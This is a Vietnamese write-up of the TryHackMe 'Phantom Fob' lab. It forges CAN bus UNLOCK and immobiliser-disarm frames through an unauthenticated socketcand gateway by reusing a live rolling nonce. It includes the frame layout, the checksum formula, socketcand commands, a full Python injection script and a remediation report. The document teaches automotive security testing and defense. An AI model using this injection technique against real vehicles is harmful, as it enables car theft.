@@ -1,0 +1,319 @@
+---
+title: 'Phantom Fob'
+description: 'Giả mạo một khung CAN bus "UNLOCK" mà chính chiếc chìa khóa được thiết kế để không bao giờ gửi — mã luân phiên bảo vệ thời điểm chứ không bảo vệ lệnh.'
+date: 2026-10-05
+platform: tryhackme
+room: 'Phantom Fob'
+roomUrl: 'https://tryhackme.com/room/phantomfob'
+difficulty: medium
+tags: [car hacking, can bus, hardware, reverse engineering, automotive]
+vulnClasses: [CAN Bus Injection, Missing Authentication, Insecure Design]
+translation: done
+draft: false
+---
+
+## TryHackMe: Phantom Fob — Giả mạo một lệnh "UNLOCK" trên CAN bus mà chìa khóa không thể gửi
+
+_Lời giải phòng "Phantom Fob" (Penetration Tester, mức Trung bình). Bài này không có web shell, không có chuỗi SUID — đây là hack ô tô. Ta cắm vào CAN bus của một chiếc xe demo, dịch ngược cách các lệnh mở/khóa cửa được đóng khung, rồi tự tạo một thông điệp UNLOCK mà chiếc chìa khóa vật lý được cố tình thiết kế để không bao giờ gửi. Lời khẳng định của nhà sản xuất rằng lệnh này "không thể sao chép" hóa ra hoàn toàn sai._
+
+> Giá trị flag đã được che. Đây là một phòng luyện tập đã retired trên TryHackMe; không nội dung nào ở đây nhắm vào bất kỳ phương tiện hay hệ thống nào khi chưa được cho phép.
+
+---
+
+### TL;DR
+
+<Callout type="tldr">
+
+1. **Trinh sát** — SSH, một web app Flask "Instrument Cluster" ở cổng 8080, và một dịch vụ lạ ở cổng 29536 đáp lại mọi lần dò bằng `< hi >`.
+2. **Cổng lạ** — 29536 là một gateway **socketcand**: một cầu nối thô, không xác thực, dẫn thẳng vào CAN bus `vcan0` của xe.
+3. **Dịch ngược** — các khung chìa khóa hợp lệ đến trên CAN ID `2A2` với cấu trúc cố định: `E8 [CMD] [NONCE] 29 [CTR] 8F [CHK]`.
+4. **Lỗ hổng** — `NONCE` luân phiên bảo vệ _thời điểm_, không bảo vệ _lệnh_. Nó không bao giờ ký lên _hành động nào_ đang được yêu cầu.
+5. **Giả mạo** — quan sát một khung thật, tái sử dụng nonce còn mới của nó, tăng bộ đếm, tính lại checksum, rồi gửi `CMD=0x17` (UNLOCK) — một lệnh mà giao diện chìa khóa hoàn toàn không có.
+6. **Thành quả** — cửa mở khóa, hệ thống chống trộm (immobiliser) bị vô hiệu, và ECU truyền flag ra qua luồng `/events` của web app.
+
+</Callout>
+
+<Callout type="insight">
+
+Thông điệp xuyên suốt cả bài: **một mã luân phiên (rolling code) xác thực thời điểm nhưng không xác thực ý định thì hoàn toàn không phải là xác thực.**
+
+</Callout>
+
+---
+
+### 1. Trinh sát
+
+Quét dịch vụ đầy đủ như thường lệ — nhưng phần thú vị không phải SSH:
+
+```text
+export IP=<target-ip>
+nmap -sT -sV -sC -p22,8080,29536 -Pn -T4 -oN nmap-services.txt $IP
+```
+
+```text
+22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu
+8080/tcp  open  http    Werkzeug httpd 3.1.8 (Python 3.12.3)
+|_http-title: Instrument Cluster
+29536/tcp open  unknown
+|   ... every single probe returns:
+|_    < hi >
+```
+
+Ba cổng kể một câu chuyện:
+
+- **8080** — một app Flask/Werkzeug mang tên _Instrument Cluster_ (bảng đồng hồ). Đây là bảng điều khiển của xe, và (như ta sẽ thấy) là thứ cho phép ta nhấn các nút chìa khóa và đọc trạng thái xe.
+- **29536** — nmap không nhận diện được. Nó đáp lại _mọi_ lần dò giao thức bằng cùng sáu byte: `< hi >`. Cách đóng khung `<...>` chính là dấu hiệu. Đây là một server **socketcand** — một đầu mạng nói một giao thức ASCII nhỏ gọn và bắc cầu các client TCP thẳng vào một CAN bus.
+
+Không có khai thác web, không có thông tin đăng nhập nào để crack. Toàn bộ phòng này nằm trên cái gateway CAN đó.
+
+### 2. Một phút nhập môn về CAN
+
+Xe hiện đại có một mạng nội bộ gọi là **CAN bus**. Mọi thành phần — cửa, bảng đồng hồ, động cơ, hệ thống chống trộm — nói chuyện với nhau bằng cách phát các thông điệp ngắn lên một dây chung duy nhất. Không có địa chỉ "gửi đến": một khung mang một **arbitration ID** (định danh đại khái _loại_ thông điệp) và tối đa 8 byte dữ liệu, và mọi node trên bus đều thấy nó.
+
+Quan trọng là, CAN cổ điển **không có xác thực tích hợp**. Bất kỳ node nào đưa được byte lên dây đều có thể giả làm bất kỳ node nào khác. Nếu có bảo mật, nó được gắn thêm ở tầng payload của thông điệp — và đó chính xác là chỗ thiết kế của phòng này sụp đổ.
+
+Ta được giao một chìa khóa có thể **Khóa** (Lock) xe và bấm **Còi** (Horn), nhưng _không có nút Mở khóa (Unlock)_. Nhà sản xuất nói lệnh mở khóa không thể sao chép. Việc của ta: quan sát lưu lượng, tìm hiểu các lệnh cửa được xây dựng thế nào, và tự tạo lệnh Unlock.
+
+### 3. Nói chuyện với gateway
+
+Giao thức của socketcand là ASCII theo dòng, bọc trong dấu ngoặc nhọn. Bắt tay để bắt đầu thấy lưu lượng là `open` interface, rồi chuyển sang `rawmode`:
+
+```text
+printf '< open vcan0 >< rawmode >' | nc $IP 29536   # streams live frames
+```
+
+Các khung bắt đầu cuộn qua:
+
+```text
+< frame 2A2 <ts> E8 72 <NN NN> 29 <CC> 8F <CHK> >
+```
+
+Không đăng nhập. Không token. Gateway vui vẻ chấp nhận `open` → `rawmode` → `send` từ bất kỳ client nào trên mạng. Đó là lỗ hổng số một: **đường truyền phát lên một bus trọng yếu về an toàn bị phơi ra với con số không về xác thực.**
+
+### 4. Dịch ngược các khung chìa khóa
+
+Quan sát bus trong lúc nhấn các nút trên app bảng đồng hồ (8080) cho thấy mọi lưu lượng chìa khóa đều rơi vào **CAN ID** **`2A2`** với một khuôn 8 byte nhất quán:
+
+```text
+E8 [CMD] [NONCE:2] 29 [CTR] 8F [CHK]
+```
+
+Nhấn từng nút có sẵn làm lộ ra byte lệnh:
+
+| **Lệnh**     | **Byte CMD** |
+| ------------ | ------------ |
+| LOCK         | `72`         |
+| HORN         | `F8`         |
+| IMMOB_ARM    | `58`         |
+| IMMOB_DISARM | `B5`         |
+| **UNLOCK**   | **`17`**     |
+
+`LOCK` và `HORN` là hai nút ta có về mặt vật lý. Nhưng byte lệnh chỉ là... một byte. Không có gì trong cấu trúc khung ngăn ta chọn `17`.
+
+#### Các thành phần động
+
+- **`NONCE`** (2 byte) — một mã luân phiên dùng chung giữa chìa khóa và ECU, xoay vòng theo bộ định thời khoảng \~0,5 giây. Đây là cơ chế "không thể sao chép". Nhưng nó **độc lập với lệnh**: cùng một nonce hợp lệ cho LOCK, HORN, hay bất cứ gì khác trong cửa sổ thời gian đó. Nó ký lên _khi nào_, không bao giờ ký lên _cái gì_.
+- **`CTR`** (1 byte) — một bộ đếm đơn điệu. ECU chấp nhận **bất kỳ** giá trị nào lớn hơn giá trị cuối nó thấy, để chặn kiểu replay ngây thơ.
+- **`CHK`** (1 byte) — một checksum trên toàn khung. Đưa vài khung đã bắt được qua phép XOR làm lộ ra công thức:
+
+```text
+  CHK = XOR(byte0 .. byte6) ^ 0xFB
+```
+
+Đó là toàn bộ cơ chế. Và nó sai ngay từ thiết kế.
+
+### 5. Lỗ hổng
+
+Nonce luân phiên lẽ ra làm mỗi lệnh không thể giả mạo. Nhưng vì nonce **không ràng buộc byte lệnh**, bảo mật sụp xuống thành một quan sát đơn giản:
+
+> Nếu tôi thấy được _một_ khung hợp lệ, tôi biết `NONCE` và `CTR` hợp lệ hiện tại. Chính những giá trị đó cho phép _bất kỳ_ lệnh nào tôi chọn — kể cả lệnh UNLOCK mà chìa khóa từ chối gửi.
+
+Vậy cuộc tấn công là:
+
+1. Kích hoạt một khung hợp lệ (nhấn LOCK qua bảng đồng hồ) và đọc `NONCE` + `CTR` còn mới trên ID `2A2`.
+2. Trong cửa sổ nonce \~0,5 giây, truyền một khung giả mạo tái sử dụng nonce đó, với giá trị bộ đếm kế tiếp, `CMD=0x17`, và một checksum đã tính lại.
+
+```text
+# UNLOCK — chìa khóa không có nút cho lệnh này
+< send 2A2 8 E8 17 <NN> <NN> 29 <CC+1> 8F <CHK> >
+
+# IMMOB_DISARM — vô hiệu hóa hệ thống chống trộm cho chắc
+< send 2A2 8 E8 B5 <NN> <NN> 29 <CC+2> 8F <CHK> >
+```
+
+ECU kiểm tra nonce (vẫn còn mới), thấy bộ đếm lớn hơn giá trị cuối (`CC+1`), xác minh checksum (ta đã tính đúng), và thực thi lệnh. Nó không có cách nào biết khung này đến từ kẻ tấn công chứ không phải từ chìa khóa.
+
+#### Luồng của khung giả mạo
+
+Toàn bộ cuộc tấn công là một cuộc đua với bộ định thời nonce \~0,5 giây: mượn một nonce còn sống từ một khung hợp lệ, rồi tiêu nó cho một lệnh mà chìa khóa không bao giờ gửi — tất cả trước khi nó xoay vòng.
+
+```text
+   ATTACKER            socketcand         CAN bus          ECU            DASHBOARD
+   (script)            tcp/29536          vcan0           (car)          tcp/8080
+      |                    |                 |               |                |
+      |  < open vcan0 >    |                 |               |                |
+      |  < rawmode >       |                 |               |                |
+      |------------------->|   (no auth required)            |                |
+      |                    |                 |               |                |
+
+  == PHASE 1: harvest a fresh nonce ==================== (race the ~0.5s timer) =
+      |                    |                 |               |                |
+      |  POST /press {"button":"LOCK"}       |               |                |
+      |------------------------------------------------------------------------>|
+      |                    |                 |  frame 2A2    |                |
+      |                    |                 |  E8 72 [NONCE] 29 [CTR] 8F [CHK]|
+      |                    |                 |<-------------------------------|
+      |                    |  broadcast (everyone on the bus sees it)          |
+      |  < frame 2A2 ... > |<----------------|               |                |
+      |<-------------------|                 |               |                |
+      |  read NONCE + CTR  |                 |               |                |
+      |                    |                 |               |                |
+
+  == PHASE 2: spend that nonce on a forbidden command ==========================
+      |                    |                 |               |                |
+      | CHK = XOR(byte0..6) ^ 0xFB           |               |                |
+      |                    |                 |               |                |
+      | < send 2A2 8 E8 17 [NONCE] 29 [CTR+1] 8F [CHK] >   (UNLOCK, CMD=0x17)  |
+      |------------------->|  inject forged  |               |                |
+      |                    |---------------->|-------------->|                |
+      |                    |                 |               |                |
+      | < send 2A2 8 E8 B5 [NONCE] 29 [CTR+2] 8F [CHK] >   (DISARM, CMD=0xB5) |
+      |------------------->|  inject forged  |               |                |
+      |                    |---------------->|-------------->|                |
+      |                    |                 |               |                |
+      |                    |     ECU checks: nonce fresh? YES               |
+      |                    |                 ctr > last?  YES               |
+      |                    |                 chk valid?   YES               |
+      |                    |     (nothing binds CMD to the nonce)          |
+      |                    |                 |  doors UNLOCK, immob DISARM  |
+      |                    |                 |               |  state+flag  |
+      |                    |                 |               |------------->|
+      |  GET /events  ->  {"locked":false,"immob":false,"flag":"[REDACTED]"}  |
+      |<-----------------------------------------------------------------------|
+      v                                                                        v
+```
+
+Mẹo nằm hoàn toàn ở PHASE 2: chính `NONCE` mà ECU phát ra cho một lệnh `LOCK` được dùng lại để cho phép `UNLOCK` và `IMMOB_DISARM`. Vì mã luân phiên không bao giờ ký lên byte `CMD`, ECU coi khung giả mạo là thật.
+
+### 6. Chứng minh khái niệm (Proof of concept)
+
+Đua với cửa sổ 0,5 giây bằng tay thì lắt nhắt, nên bản đáng tin là viết thành script: một socket vừa bắt gói _vừa_ tiêm gói, một luồng nền phân tích các khung còn sống, và ta bắn UNLOCK + DISARM trong cùng một cửa sổ nonce còn mới.
+
+```text
+import socket, time, re, threading, urllib.request, json
+
+HOST= "<target-ip>"
+s= socket.socket(); s.connect((HOST, 29536)); s.settimeout(2.0)
+
+def rd(t):
+    s.settimeout(t); b= b""
+    try:
+        while True: b+= s.recv(4096)
+    except: pass
+    return b
+
+# handshake: open the bus, switch to raw frame mode
+rd(1.0); s.sendall(b"< open vcan0 >");rd(1.0); s.sendall(b"< rawmode >")
+
+last= [None]; stop= [False]
+
+def reader():                       # background: track the newest 2A2 frame
+    s.settimeout(0.15); buf= ""
+    while not stop[0]:
+        try: buf+= s.recv(8192).decode(errors="replace")
+        except: continue
+        for msgin re.findall(r"<[^>]*>", buf):
+            m= re.match(r"<\s*frame\s+2A2\s+\S+\s+(.*?)\s*>", msg)
+            if m: last[0] = (time.time(), m.group(1).strip())
+        if ">" in buf: buf= buf[buf.rindex(">") + 1:]
+threading.Thread(target=reader, daemon=True).start()
+
+def press(b):                       # press a dashboard button to emit a real frame
+    urllib.request.urlopen(urllib.request.Request(
+        "http://%s:8080/press" % HOST,
+        ('{"button":"%s"}' % b).encode(),
+        {"Content-Type": "application/json"}), timeout=5).read()
+
+def chk(b):                         # CHK = XOR(byte0..byte6) ^ 0xFB
+    x= 0
+    for vin b[:7]: x^= v
+    return x^ 0xFB
+
+def inj(cmd, nonce, ctr):           # forge and send one frame
+    b= [0xE8, cmd, (nonce>> 8) & 0xff, nonce& 0xff, 0x29, ctr& 0xff, 0x8F, 0]
+    b[7] = chk(b)
+    s.sendall(("< send 2A2 8 " + " ".join("%02X" % xfor xin b) + " >").encode())
+
+def freshcap():                     # force a legit frame, read its nonce + ctr
+    before= last[0][1] if last[0] else None
+    press("LOCK")
+    for _in range(50):
+        if last[0] and last[0][1] != before: break
+        time.sleep(0.02)
+    return int(last[0][1][4:8], 16), int(last[0][1][10:12], 16)
+
+time.sleep(1.0)
+nonce, ctr= freshcap()
+inj(0x17, nonce, ctr+ 1)           # UNLOCK
+inj(0xB5, nonce, ctr+ 2)           # IMMOB_DISARM
+print("fired UNLOCK(17)+DISARM(b5) nonce=%04x ctr=%02x" % (nonce, ctr))
+
+# read the flag off the dashboard's SSE event stream
+r= urllib.request.urlopen("http://%s:8080/events" % HOST, timeout=8)
+t0= time.time()
+while time.time() - t0< 8:
+    l= r.readline().decode()
+    if l.startswith("data:"):
+        d= json.loads(l[5:].strip())
+        if d.get("flag"):
+            print("STATE:", {k: d[k] for kin ('locked', 'immob', 'horn')})
+            print("FLAG:", d["flag"]);break
+r.close(); stop[0] = True; s.close()
+```
+
+Chạy nó:
+
+```text
+fired UNLOCK(17)+DISARM(b5) nonce=<...> ctr=<..>
+STATE: {'locked': False, 'immob': False, 'horn': False}
+FLAG: THM{__redacted__}
+```
+
+Cửa mở khóa, hệ thống chống trộm bị vô hiệu, và ECU nhả bí mật được bảo vệ ra trên luồng `/events`. Kết thúc — chỉ từ quyền truy cập mạng, không chìa khóa, không thông tin đăng nhập, không chìa vật lý.
+
+---
+
+### Báo cáo: viết lại phát hiện thành một finding
+
+Nếu bạn dùng phòng này để luyện viết báo cáo (như ghi chú trên Notion), đây là khuôn của nó.
+
+**Tiêu đề:** CAN Bus command injection trong gateway socketcand (tcp/29536) cho phép kẻ tấn công không xác thực mở khóa xe và vô hiệu hóa hệ thống chống trộm.
+
+<Callout type="critical">
+
+**Mức độ nghiêm trọng:** Tới hạn — CVSS 3.1 `9.6` (`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`).
+
+**Tóm tắt:** Một kẻ tấn công không xác thực trên mạng mở khóa xe và vô hiệu hóa hệ thống chống trộm bằng cách tiêm một khung CAN duy nhất mà chìa khóa được thiết kế để không bao giờ gửi. Gateway socketcand ở tcp/29536 cho phép truyền phát khung thô mà không cần xác thực; cơ chế mã luân phiên chỉ bảo vệ _thời điểm_, không bảo vệ _lệnh_, nên một giá trị luân phiên còn mới quan sát được từ bất kỳ khung chìa khóa hợp lệ nào đều có thể tái sử dụng để giả mạo một lệnh UNLOCK đặc quyền.
+
+**Tác động:** Vô hiệu hoàn toàn cơ chế vào xe không cần chìa và hệ thống chống trộm, chỉ từ mạng. Cùng một primitive đó giả mạo được _bất kỳ_ lệnh CAN nào mà ECU chấp nhận. Có thể viết thành script và chạy tin cậy.
+
+</Callout>
+
+<Callout type="fix">
+
+**Khuyến nghị khắc phục:**
+
+- **Xác thực gateway.** Không phơi đường truyền phát của socketcand ra mạng mà không xác thực.
+- **Ràng buộc MAC với lệnh.** Thay nonce thời gian độc-lập-với-lệnh bằng một MAC tính trên `CMD ‖ CTR` (ví dụ AES-CMAC), để một giá trị bắt được cho một lệnh không thể cho phép một lệnh khác.
+- **Thực thi bộ đếm nghiêm ngặt.** Yêu cầu bộ đếm tăng nghiêm ngặt (`last + 1`) để các giá trị bắt được không thể dùng lại trong một cửa sổ.
+
+</Callout>
+
+### Điểm rút ra
+
+- **`< hi >`** **ở một cổng lạ là một manh mối, không phải ngõ cụt.** Cách đóng khung bằng ngoặc nhọn là chữ ký của socketcand — nhận ra giao thức là cả phòng mở ra.
+- **Mã luân phiên không phải phép màu.** Một nonce xoay vòng theo bộ định thời chỉ chống được _replay của cùng một lệnh_. Nếu nó không ràng buộc về mặt mật mã _lệnh nào_ đang được gửi, kẻ tấn công chỉ việc đổi byte lệnh và dùng lại nonce còn sống.
+- **Xác thực phải đặt trên ý định, không phải thời điểm.** Cách khắc phục chính là bài học: một MAC trên `CMD ‖ CTR` sẽ khiến lệnh UNLOCK giả mạo trở nên không hợp lệ. Xe "không thể sao chép" lệnh — nhưng nó không bao giờ kiểm tra xem lệnh có khớp với mã hay không.
+- **CAN cổ điển không có xác thực gốc.** Bất cứ thứ gì truyền phát được đều có thể giả làm bất kỳ ECU nào. Vì vậy các cầu nối CAN hướng mạng phải tự mang xác thực mạnh; phơi đường truyền phát thô ra tương đương với việc phát chìa khóa cho thiên hạ.
+
+Cảm ơn bạn đã đọc. Phantom Fob là một bài nhập môn nhỏ nhưng hay về bảo mật ô tô/CAN — không memory corruption, không khai thác web, chỉ là quan sát kỹ một giao thức và nhận ra rằng "không thể sao chép" đang bảo vệ nhầm nửa của thông điệp.
